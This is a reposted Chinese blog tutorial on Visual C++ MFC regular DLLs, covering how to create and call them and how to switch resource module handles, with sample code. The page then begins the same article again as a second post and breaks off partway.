<p>　　另外，自从本文开始连载后，收到了一些读者的e-mail。有的读者提出了一些问题，笔者将在本文的最后一次连载中选取其中的典型问题进行解答。由于时间的关系，对于读者朋友的来信，笔者暂时不能一一回复，还望海涵！由于笔者的水平有限，文中难免有错误和纰漏，也热诚欢迎读者朋友不吝指正！</p>

<p>　　5. MFC规则DLL</p>

<p>　　5.1 概述</p>

<p>　　MFC规则DLL的概念体现在两方面：</p>

<p>　　（1） 它是MFC的
　　
　　“是MFC的”意味着可以在这种DLL的内部使用MFC；</p>

<p>　　（2） 它是规则的</p>

<p>　　“是规则的”意味着它不同于MFC扩展DLL，在MFC规则DLL的内部虽然可以使用MFC，但是其与应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>的接口不能是MFC。而MFC扩展DLL与应用程序的接口可以是MFC，可以从MFC扩展DLL中导出一个MFC类的派生类。</p>

<p>　　Regular DLL能够被所有支持DLL技术的语言所编写的应用程序调用，当然也包括使用MFC的应用程序。在这种动态连接库中，包含一个从CWinApp继承下来的类，DllMain函数则由MFC自动提供。</p>

<p>　　Regular DLL分为两类：</p>

<p>　　（1）静态链接到MFC 的规则DLL</p>

<p>　　静态链接到MFC的规则DLL与MFC库（包括MFC扩展 DLL）静态链接，将MFC库的代码直接生成在.dll文件中。在调用这种DLL的接口时，MFC使用DLL的资源。因此，在静态链接到MFC 的规则DLL中不需要进行模块状态的切换。</p>

<p>　　使用这种方法生成的规则DLL其程序较大，也可能包含重复的代码。</p>

<p>　　（2）动态链接到MFC 的规则DLL</p>

<p>　　动态链接到MFC 的规则DLL 可以和使用它的可执行文件同时动态链接到 MFC DLL 和任何MFC扩展 DLL。在使用了MFC共享库的时候，默认情况下，MFC使用主应用程序的资源句柄来加载资源模板。这样，当DLL和应用程序中存在相同ID的资源时（即所谓的资源重复问题），系统可能不能获得正确的资源。因此，对于共享MFC DLL的规则DLL，我们必须进行模块切换以使得MFC能够找到正确的资源模板。</p>

<p>　　我们可以在Visual C++中设置MFC规则DLL是静态链接到MFC DLL还是动态链接到MFC DLL。如图8，依次选择Visual C++的project -&gt; Settings -&gt; General菜单或选项，在Microsoft Foundation Classes中进行设置。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="1" src="http://dev.yesky.com/imagelist/05/10/496tcjb95zkf.jpg" height="1" /><img border="0" width="1" src="http://dev.yesky.com/imagelist/05/10/496tcjb95zkf.jpg" height="1" />
图8 设置动态/静态链接MFC DLL</td>
</tr>
</table>


<p>　　5.2 MFC规则DLL的创建</p>

<p>　　我们来一步步讲述使用MFC向导创建MFC规则DLL的过程，首先新建一个project，如图9，选择project的类型为MFC AppWizard(dll)。点击OK进入如图10所示的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="438" src="http://dev.yesky.com/imagelist/05/10/181ysg7l3l3w.jpg" height="283" /><img border="0" width="438" src="http://dev.yesky.com/imagelist/05/10/181ysg7l3l3w.jpg" height="283" />
图9 MFC DLL工程的创建</td>
</tr>
</table>


<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" /><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" />
图10所示对话框中的1区选择MFC DLL的类别。</td>
</tr>
</table>


<p>　　2区选择是否支持automation（自动化）技术， automation 允许用户在一个应用程序中操纵另外一个应用程序或组件。例如，我们可以在应用程序中利用 Microsoft Word 或Microsoft Excel的工具，而这种使用对用户而言是透明的。自动化技术可以大大简化和加快应用程序的开发。</p>

<p>　　3区选择是否支持Windows Sockets，当选择此项目时，应用程序能在 TCP/IP <a target="_blank" href="http://product.yesky.com/net/" class="bluekey"><font color="#003399">网络</font></a>上进行通信。 CWinApp派生类的InitInstance成员函数会初始化通讯端的支持，同时工程中的StdAfx.h文件会自动include &lt;AfxSock.h&gt;头文件。</p>

<p>　　添加socket通讯支持后的InitInstance成员函数如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>BOOL CRegularDllSocketApp::InitInstance()
{
　if (!AfxSocketInit())
　{
　　AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
　　return FALSE;
　}
　return TRUE;
}</td>
</tr>
</table>


<p>　　4区选择是否由MFC向导自动在源代码中添加注释，一般我们选择“Yes,please”。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" /><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" />
图10 MFC DLL的创建选项</td>
</tr>
</table>


<p>　　5.3 一个简单的MFC规则DLL</p>

<p>　　这个DLL的例子（属于静态链接到MFC 的规则DLL）中提供了一个如图11所示的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/6hb0hlv43ptr.jpg" />
图11 MFC规则DLL例子</td>
</tr>
</table>


<p>　　在DLL中添加对话框的方式与在MFC应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>中是一样的。 在图11所示DLL中的对话框的Hello按钮上点击时将MessageBox一个“Hello,pconline的网友”对话框，下面是相关的文件及源代码，其中删除了MFC向导自动生成的绝大多数注释（下载本工程）：</p>

<p>　　第一组文件：CWinApp继承类的声明与实现</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>// RegularDll.h : main header file for the REGULARDLL DLL#if !defined(AFX_REGULARDLL_H__3E9CB22B_588B_4388_B778_B3416ADB79B3__INCLUDED_)
#define AFX_REGULARDLL_H__3E9CB22B_588B_4388_B778_B3416ADB79B3__INCLUDED_

#if _MSC_VER &gt; 1000
#pragma once
#endif // _MSC_VER &gt; 1000

#ifndef __AFXWIN_H__
#error include ’stdafx.h’ before including this file for PCH
#endif
#include &#8220;resource.h&#8221; // main symbols

class CRegularDllApp : public CWinApp
{
　public:
　　CRegularDllApp();
　　DECLARE_MESSAGE_MAP()
};

#endif

// RegularDll.cpp : Defines the initialization routines for the DLL.

#include &#8220;stdafx.h&#8221;
#include &#8220;RegularDll.h&#8221;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

BEGIN_MESSAGE_MAP(CRegularDllApp, CWinApp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////

// CRegularDllApp construction

CRegularDllApp::CRegularDllApp()
{
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CRegularDllApp object

CRegularDllApp theApp;</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　在这一组文件中定义了一个继承自CWinApp的类CRegularDllApp，并同时定义了其的一个实例theApp。乍一看，您会以为它是一个MFC应用程序，因为MFC应用程序也包含这样的在工程名后添加“App”组成类名的类（并继承自CWinApp类），也定义了这个类的一个全局实例theApp。</p>

<p>　　我们知道，在MFC应用程序中CWinApp取代了SDK程序中WinMain的地位，SDK程序WinMain所完成的工作由CWinApp的三个函数完成：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>virtual BOOL InitApplication( );virtual BOOL InitInstance( );

virtual BOOL Run( ); //传说中MFC程序的“活水源头”</td>
</tr>
</table>


<p>　　但是MFC规则DLL并不是MFC应用程序，它所继承自CWinApp的类不包含消息循环。这是因为，MFC规则DLL不包含CWinApp::Run机制，主消息泵仍然由应用程序拥有。如果DLL 生成无模式对话框或有自己的主框架窗口，则应用程序的主消息泵必须调用从DLL 导出的函数来调用PreTranslateMessage成员函数。</p>

<p>　　另外，MFC规则DLL与MFC 应用程序中一样，需要将所有 DLL中元素的初始化放到InitInstance 成员函数中。</p>

<p>　　第二组文件 自定义对话框类声明及实现</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#if !defined(AFX_DLLDIALOG_H__CEA4C6AF_245D_48A6_B11A_A5521EAD7C4E__INCLUDED_)
#define AFX_DLLDIALOG_H__CEA4C6AF_245D_48A6_B11A_A5521EAD7C4E__INCLUDED_#if _MSC_VER &gt; 1000
#pragma once
#endif // _MSC_VER &gt; 1000
// DllDialog.h : header file
/////////////////////////////////////////////////////////////////////////////
// CDllDialog dialog

class CDllDialog : public CDialog
{
　// Construction
　public:
　　CDllDialog(CWnd* pParent = NULL); // standard constructor
　　enum { IDD = IDD_DLL_DIALOG };
　protected:
　　virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV support
　　// Implementation
　protected:
　　afx_msg void OnHelloButton();
　　DECLARE_MESSAGE_MAP()
};
#endif

// DllDialog.cpp : implementation file

#include &#8220;stdafx.h&#8221;
#include &#8220;RegularDll.h&#8221;
#include &#8220;DllDialog.h&#8221;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDllDialog dialog

CDllDialog::CDllDialog(CWnd* pParent /*=NULL*/)
: CDialog(CDllDialog::IDD, pParent)
{}

void CDllDialog::DoDataExchange(CDataExchange* pDX)
{
　CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CDllDialog, CDialog)
　ON_BN_CLICKED(IDC_HELLO_BUTTON, OnHelloButton)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDllDialog message handlers

void CDllDialog::OnHelloButton()
{
　MessageBox(&#8220;Hello,pconline的网友&#8221;,&#8221;pconline&#8221;);
}</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　这一部分的编程与一般的应用程序根本没有什么不同，我们照样可以利用MFC类向导来自动为对话框上的控件添加事件。MFC类向导照样会生成类似ON_BN_CLICKED(IDC_HELLO_BUTTON, OnHelloButton)的消息映射宏。</p>

<p>　　第三组文件 DLL中的资源文件</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//// Microsoft Developer Studio generated include file.

// Used by RegularDll.rc

//

#define IDD_DLL_DIALOG 1000

#define IDC_HELLO_BUTTON 1000</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　在MFC规则DLL中使用资源也与在MFC应用程序中使用资源没有什么不同，我们照样可以用Visual C++的资源编辑工具进行资源的添加、删除和属性的更改。</p>

<p>　　第四组文件 MFC规则DLL接口函数</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &#8220;StdAfx.h&#8221;
#include &#8220;DllDialog.h&#8221;extern &#8220;C&#8221; __declspec(dllexport) void ShowDlg(void)
{
　CDllDialog dllDialog;
　dllDialog.DoModal();
}</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　这个接口并不使用MFC，但是在其中却可以调用MFC扩展类CdllDialog的函数，这体现了“规则”的概类。</p>

<p>　　与非MFC DLL完全相同，我们可以使用__declspec(dllexport)声明或在.def中引出的方式导出MFC规则DLL中的接口。
　　5.4 MFC规则DLL的调用</p>

<p>　　笔者编写了如图12的对话框MFC<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>（下载本工程）来调用5.3节的MFC规则DLL，在这个程序的对话框上点击“调用DLL”按钮时弹出5.3节MFC规则DLL中的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/y661eb38d8t2.jpg" />
图12 MFC规则DLL的调用例子</td>
</tr>
</table>


<p>　　下面是“调用DLL”按钮单击事件的消息处理函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CRegularDllCallDlg::OnCalldllButton()
{
　typedef void (*lpFun)(void);
　HINSTANCE hDll; //DLL句柄
　hDll = LoadLibrary(&#8220;RegularDll.dll&#8221;);
　if (NULL==hDll)
　{
　　MessageBox(&#8220;DLL加载失败&#8221;);
　}　lpFun addFun; //函数指针
　lpFun pShowDlg = (lpFun)GetProcAddress(hDll,&#8221;ShowDlg&#8221;);
　if (NULL==pShowDlg)
　{
　　MessageBox(&#8220;DLL中函数寻找失败&#8221;);
　}
　pShowDlg();
}</td>
</tr>
</table>


<p>　　上述例子中给出的是显示调用的方式，可以看出，其调用方式与第4节中非MFC DLL的调用方式没有什么不同。</p>

<p>　　我们照样可以在EXE程序中隐式调用MFC规则DLL，只需要将DLL工程生成的.lib文件和.dll文件拷入当前工程所在的目录，并在RegularDllCallDlg.cpp文件（图12所示对话框类的实现文件）的顶部添加：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#pragma comment(lib,&#8221;RegularDll.lib&#8221;)
void ShowDlg(void);</td>
</tr>
</table>


<p>　　并将void CRegularDllCallDlg::OnCalldllButton() 改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CRegularDllCallDlg::OnCalldllButton()
{
　ShowDlg();
}</td>
</tr>
</table>


<p>　　5.5 共享MFC DLL的规则DLL的模块切换</p>

<p>　　应用程序进程本身及其调用的每个DLL模块都具有一个全局唯一的HINSTANCE句柄，它们代表了DLL或EXE模块在进程虚拟空间中的起始地址。进程本身的模块句柄一般为0x400000，而DLL模块的缺省句柄为0x10000000。如果程序同时加载了多个DLL，则每个DLL模块都会有不同的HINSTANCE。应用程序在加载DLL时对其进行了重定位。</p>

<p>　　共享MFC DLL（或MFC扩展DLL）的规则DLL涉及到HINSTANCE句柄问题，HINSTANCE句柄对于加载资源特别重要。EXE和DLL都有其自己的资源，而且这些资源的ID可能重复，应用程序需要通过资源模块的切换来找到正确的资源。如果应用程序需要来自于DLL的资源，就应将资源模块句柄指定为DLL的模块句柄；如果需要EXE文件中包含的资源，就应将资源模块句柄指定为EXE的模块句柄。</p>

<p>　　这次我们创建一个动态链接到MFC DLL的规则DLL（下载本工程），在其中包含如图13的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/qy3n1xcn12i7.jpg" />
图13 DLL中的对话框</td>
</tr>
</table>


<p>　　另外，在与这个DLL相同的工作区中生成一个基于对话框的MFC程序，其对话框与图12完全一样。但是在此工程中我们另外添加了一个如图14的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/d5qj203lursc.jpg" />
图14 EXE中的对话框</td>
</tr>
</table>


<p>　　图13和图14中的对话框除了caption不同（以示区别）以外，其它的都相同。</p>

<p>　　尤其值得特别注意，在DLL和EXE中我们对图13和图14的对话框使用了相同的资源ID=2000，在DLL和EXE工程的resource.h中分别有如下的宏：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//DLL中对话框的ID#define IDD_DLL_DIALOG 2000

//EXE中对话框的ID

#define IDD_EXE_DIALOG 2000</td>
</tr>
</table>


<p>　　与5.3节静态链接MFC DLL的规则DLL相同，我们还是在规则DLL中定义接口函数ShowDlg，原型如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &#8220;StdAfx.h&#8221;
#include &#8220;SharedDll.h&#8221;void ShowDlg(void)
{
　CDialog dlg(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　而为应用工程主对话框的“调用DLL”的单击事件添加如下消息处理函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CSharedDllCallDlg::OnCalldllButton()
{
　ShowDlg();
}</td>
</tr>
</table>


<p>　　我们以为单击“调用DLL”会弹出如图13所示DLL中的对话框，可是可怕的事情发生了，我们看到是图14所示EXE中的对话框！
　　惊讶？</p>

<p>　　产生这个问题的根源在于应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>与MFC规则DLL共享MFC DLL（或MFC扩展DLL）的程序总是默认使用EXE的资源，我们必须进行资源模块句柄的切换，其实现方法有三：</p>

<p>　　方法一 在DLL接口函数中使用：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AFX_MANAGE_STATE(AfxGetStaticModuleState());</td>
</tr>
</table>


<p>　　我们将DLL中的接口函数ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　//方法1:在函数开始处变更，在函数结束时恢复
　//将AFX_MANAGE_STATE(AfxGetStaticModuleState());作为接口函数的第一//条语句进行模块状态切换　AFX_MANAGE_STATE(AfxGetStaticModuleState());
　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　这次我们再点击EXE程序中的“调用DLL”按钮，弹出的是DLL中的如图13的对话框！嘿嘿，弹出了正确的对话框资源。</p>

<p>　　AfxGetStaticModuleState是一个函数，其原型为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td height="21">AFX_MODULE_STATE* AFXAPI AfxGetStaticModuleState( );</td>
</tr>
</table>


<p>　　该函数的功能是在栈上（这意味着其作用域是局部的）创建一个AFX_MODULE_STATE类（模块全局数据也就是模块状态）的实例，对其进行设置，并将其指针pModuleState返回。</p>

<p>　　AFX_MODULE_STATE类的原型如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>// AFX_MODULE_STATE (global data for a module)class AFX_MODULE_STATE : public CNoTrackObject
{
　public:
　　#ifdef _AFXDLL
　　　AFX_MODULE_STATE(BOOL bDLL, WNDPROC pfnAfxWndProc, DWORD dwVersion);
　　　AFX_MODULE_STATE(BOOL bDLL, WNDPROC pfnAfxWndProc, DWORD dwVersion,BOOL bSystem);
　　#else
　　　AFX_MODULE_STATE(BOOL bDLL);
　　#endif
　　~AFX_MODULE_STATE();

　　CWinApp* m_pCurrentWinApp;
　　HINSTANCE m_hCurrentInstanceHandle;
　　HINSTANCE m_hCurrentResourceHandle;
　　LPCTSTR m_lpszCurrentAppName;

　　… //省略后面的部分
}</td>
</tr>
</table>


<p>　　AFX_MODULE_STATE类利用其构造函数和析构函数进行存储模块状态现场及恢复现场的工作，类似汇编中call指令对pc指针和sp寄存器的保存与恢复、中断服务程序的中断现场压栈与恢复以及<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>线程调度的任务控制块保存与恢复。</p>

<p>　　许多看似不着边际的知识点居然有惊人的相似！</p>

<p>　　AFX_MANAGE_STATE是一个宏，其原型为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AFX_MANAGE_STATE( AFX_MODULE_STATE* pModuleState )</td>
</tr>
</table>


<p>　　该宏用于将pModuleState设置为当前的有效模块状态。当离开该宏的作用域时（也就离开了pModuleState所指向栈上对象的作用域），先前的模块状态将由AFX_MODULE_STATE的析构函数恢复。</p>

<p>　　方法二 在DLL接口函数中使用：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AfxGetResourceHandle();AfxSetResourceHandle(HINSTANCE xxx);</td>
</tr>
</table>


<p>　　AfxGetResourceHandle用于获取当前资源模块句柄，而AfxSetResourceHandle则用于设置程序目前要使用的资源模块句柄。</p>

<p>　　我们将DLL中的接口函数ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　//方法2的状态变更
　HINSTANCE save_hInstance = AfxGetResourceHandle();
　AfxSetResourceHandle(theApp.m_hInstance);
　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();　//方法2的状态还原
　AfxSetResourceHandle(save_hInstance);
}</td>
</tr>
</table>


<p>　　通过AfxGetResourceHandle和AfxSetResourceHandle的合理变更，我们能够灵活地设置程序的资源模块句柄，而方法一则只能在DLL接口函数退出的时候才会恢复模块句柄。方法二则不同，如果将ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>extern CSharedDllApp theApp; //需要声明theApp外部全局变量void ShowDlg(void)
{
　//方法2的状态变更
　HINSTANCE save_hInstance = AfxGetResourceHandle();
　AfxSetResourceHandle(theApp.m_hInstance);

　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();

　//方法2的状态还原

　AfxSetResourceHandle(save_hInstance);

　//使用方法2后在此处再进行操作针对的将是应用程序的资源

　CDialog dlg1(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg1.DoModal();
}</td>
</tr>
</table>


<p>　　在应用程序主对话框的“调用DLL”按钮上点击，将看到两个对话框，相继为DLL中的对话框（图13）和EXE中的对话框（图14）。</p>

<p>　　方法三 由应用程序自身切换</p>

<p>　　资源模块的切换除了可以由DLL接口函数完成以外，由应用程序自身也能完成（下载本工程）。</p>

<p>　　现在我们把DLL中的接口函数改为最简单的：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　CDialog dlg(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　而将应用程序的OnCalldllButton函数改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CSharedDllCallDlg::OnCalldllButton()
{
　//方法3：由应用程序本身进行状态切换
　//获取EXE模块句柄　HINSTANCE exe_hInstance = GetModuleHandle(NULL);

　//或者HINSTANCE exe_hInstance = AfxGetResourceHandle();
　//获取DLL模块句柄

　HINSTANCE dll_hInstance = GetModuleHandle(&#8220;SharedDll.dll&#8221;);
　AfxSetResourceHandle(dll_hInstance); //切换状态
　ShowDlg(); //此时显示的是DLL的对话框
　AfxSetResourceHandle(exe_hInstance); //恢复状态

　//资源模块恢复后再调用ShowDlg
　ShowDlg(); //此时显示的是EXE的对话框
}</td>
</tr>
</table>


<p>　　方法三中的Win32函数GetModuleHandle可以根据DLL的文件名获取DLL的模块句柄。如果需要得到EXE模块的句柄，则应调用带有Null参数的GetModuleHandle。</p>

<p>　　方法三与方法二的不同在于方法三是在应用程序中利用AfxGetResourceHandle和AfxSetResourceHandle进行资源模块句柄切换的。同样地，在应用程序主对话框的“调用DLL”按钮上点击，也将看到两个对话框，相继为DLL中的对话框（图13）和EXE中的对话框（图14）。</p>

<p>　　在下一节我们将对MFC扩展DLL进行详细分析和实例讲解，欢迎您继续关注本系列连载。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:10:42+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-si//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-san/">
		
			Visual C++动态链接库编程（三）</a>
	</h2>
	<div class="entry-content">
		<p>　　第4节我们对非MFC DLL进行了介绍，这一节将详细地讲述MFC规则DLL的创建与使用技巧。</p>

<p>　　另外，自从本文开始连载后，收到了一些读者的e-mail。有的读者提出了一些问题，笔者将在本文的最后一次连载中选取其中的典型问题进行解答。由于时间的关系，对于读者朋友的来信，笔者暂时不能一一回复，还望海涵！由于笔者的水平有限，文中难免有错误和纰漏，也热诚欢迎读者朋友不吝指正！</p>

<p>　　5. MFC规则DLL</p>

<p>　　5.1 概述</p>

<p>　　MFC规则DLL的概念体现在两方面：</p>

<p>　　（1） 它是MFC的
　　
　　“是MFC的”意味着可以在这种DLL的内部使用MFC；</p>

<p>　　（2） 它是规则的</p>

<p>　　“是规则的”意味着它不同于MFC扩展DLL，在MFC规则DLL的内部虽然可以使用MFC，但是其与应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>的接口不能是MFC。而MFC扩展DLL与应用程序的接口可以是MFC，可以从MFC扩展DLL中导出一个MFC类的派生类。</p>

<p>　　Regular DLL能够被所有支持DLL技术的语言所编写的应用程序调用，当然也包括使用MFC的应用程序。在这种动态连接库中，包含一个从CWinApp继承下来的类，DllMain函数则由MFC自动提供。</p>

<p>　　Regular DLL分为两类：</p>

<p>　　（1）静态链接到MFC 的规则DLL</p>

<p>　　静态链接到MFC的规则DLL与MFC库（包括MFC扩展 DLL）静态链接，将MFC库的代码直接生成在.dll文件中。在调用这种DLL的接口时，MFC使用DLL的资源。因此，在静态链接到MFC 的规则DLL中不需要进行模块状态的切换。</p>

<p>　　使用这种方法生成的规则DLL其程序较大，也可能包含重复的代码。</p>

<p>　　（2）动态链接到MFC 的规则DLL</p>

<p>　　动态链接到MFC 的规则DLL 可以和使用它的可执行文件同时动态链接到 MFC DLL 和任何MFC扩展 DLL。在使用了MFC共享库的时候，默认情况下，MFC使用主应用程序的资源句柄来加载资源模板。这样，当DLL和应用程序中存在相同ID的资源时（即所谓的资源重复问题），系统可能不能获得正确的资源。因此，对于共享MFC DLL的规则DLL，我们必须进行模块切换以使得MFC能够找到正确的资源模板。</p>

<p>　　我们可以在Visual C++中设置MFC规则DLL是静态链接到MFC DLL还是动态链接到MFC DLL。如图8，依次选择Visual C++的project -&gt; Settings -&gt; General菜单或选项，在Microsoft Foundation Classes中进行设置。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="439" src="http://dev.yesky.com/imagelist/05/10/496tcjb95zkf.jpg" height="288" /><img border="0" width="439" src="http://dev.yesky.com/imagelist/05/10/496tcjb95zkf.jpg" height="288" />
图8 设置动态/静态链接MFC DLL</td>
</tr>
</table>


<p>　　5.2 MFC规则DLL的创建</p>

<p>　　我们来一步步讲述使用MFC向导创建MFC规则DLL的过程，首先新建一个project，如图9，选择project的类型为MFC AppWizard(dll)。点击OK进入如图10所示的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="438" src="http://dev.yesky.com/imagelist/05/10/181ysg7l3l3w.jpg" height="283" /><img border="0" width="438" src="http://dev.yesky.com/imagelist/05/10/181ysg7l3l3w.jpg" height="283" />
图9 MFC DLL工程的创建</td>
</tr>
</table>


<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" /><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" />
图10所示对话框中的1区选择MFC DLL的类别。</td>
</tr>
</table>


<p>　　2区选择是否支持automation（自动化）技术， automation 允许用户在一个应用程序中操纵另外一个应用程序或组件。例如，我们可以在应用程序中利用 Microsoft Word 或Microsoft Excel的工具，而这种使用对用户而言是透明的。自动化技术可以大大简化和加快应用程序的开发。</p>

<p>　　3区选择是否支持Windows Sockets，当选择此项目时，应用程序能在 TCP/IP <a target="_blank" href="http://product.yesky.com/net/" class="bluekey"><font color="#003399">网络</font></a>上进行通信。 CWinApp派生类的InitInstance成员函数会初始化通讯端的支持，同时工程中的StdAfx.h文件会自动include &lt;AfxSock.h&gt;头文件。</p>

<p>　　添加socket通讯支持后的InitInstance成员函数如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>BOOL CRegularDllSocketApp::InitInstance()
{
　if (!AfxSocketInit())
　{
　　AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
　　return FALSE;
　}
　return TRUE;
}</td>
</tr>
</table>


<p>　　4区选择是否由MFC向导自动在源代码中添加注释，一般我们选择“Yes,please”。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" /><img border="0" width="441" src="http://dev.yesky.com/imagelist/05/10/vem5qtksd311.jpg" height="305" />
图10 MFC DLL的创建选项</td>
</tr>
</table>


<p>　　5.3 一个简单的MFC规则DLL</p>

<p>　　这个DLL的例子（属于静态链接到MFC 的规则DLL）中提供了一个如图11所示的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="331" src="http://dev.yesky.com/imagelist/05/10/6hb0hlv43ptr.jpg" height="193" /><img border="0" width="331" src="http://dev.yesky.com/imagelist/05/10/6hb0hlv43ptr.jpg" height="193" />
图11 MFC规则DLL例子</td>
</tr>
</table>


<p>　　在DLL中添加对话框的方式与在MFC应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>中是一样的。 在图11所示DLL中的对话框的Hello按钮上点击时将MessageBox一个“Hello,pconline的网友”对话框，下面是相关的文件及源代码，其中删除了MFC向导自动生成的绝大多数注释（下载本工程）：</p>

<p>　　第一组文件：CWinApp继承类的声明与实现</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>// RegularDll.h : main header file for the REGULARDLL DLL#if !defined(AFX_REGULARDLL_H__3E9CB22B_588B_4388_B778_B3416ADB79B3__INCLUDED_)
#define AFX_REGULARDLL_H__3E9CB22B_588B_4388_B778_B3416ADB79B3__INCLUDED_#if _MSC_VER &gt; 1000
#pragma once
#endif // _MSC_VER &gt; 1000
